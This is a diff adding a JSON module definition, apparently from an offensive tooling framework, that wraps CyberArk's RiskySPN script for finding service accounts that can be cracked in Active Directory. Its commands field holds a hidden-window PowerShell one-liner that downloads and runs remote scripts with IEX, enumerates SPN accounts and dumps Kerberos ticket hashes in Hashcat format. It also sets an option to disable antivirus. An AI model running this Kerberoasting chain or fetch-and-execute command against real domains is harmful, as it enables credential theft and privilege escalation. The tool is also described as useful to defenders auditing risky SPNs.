@@ -1,0 +1,34 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Find-PotentiallyCrackableAccounts",
+    "author": ["Matan Hart (@machosec)"],
+    "path": ["windows", "x64", "powershell", "privesc", "Find-PotentiallyCrackableAccounts.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Reveals juicy information about user accounts associated with SPN. This function queries the Active Directory and retrieve information about user accounts associated with SPN. This information could determine if a service account is potentially crackable. User accounts associated with SPN are vulnerable to offline brute-forceing and they are often (by default) configured with weak password and encryption (RC4-HMAC). Requires Active Directory authentication (domain user is enough). ",
+    "remote": "https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1",
+    "local": ["data", "src", "cyberark", "RiskySPN", "Find-PotentiallyCrackableAccounts.ps1"],
+    "options": {
+      "Domain": [""],
+      "AddGroups": [],
+      "Sensitive": [],
+      "GetSPNs": [],
+      "FullData": []
+    },
+    "description": "RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). This module can assist blue teams to identify potentially risky SPNs as well as red teams to escalate privileges by leveraging Kerberos and Active Directory. For detailed information: http://www.cyberark.com/blog/service-accounts-weakest-link-chain/",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1');IEX (new-object net.webclient).DownloadString('https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-TGSCipher.ps1');Find-PotentiallyCrackableAccounts -Verbose -Sensitive -Stealth -GetSPNs|Get-TGSCipher -Format 'Hashcat'\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
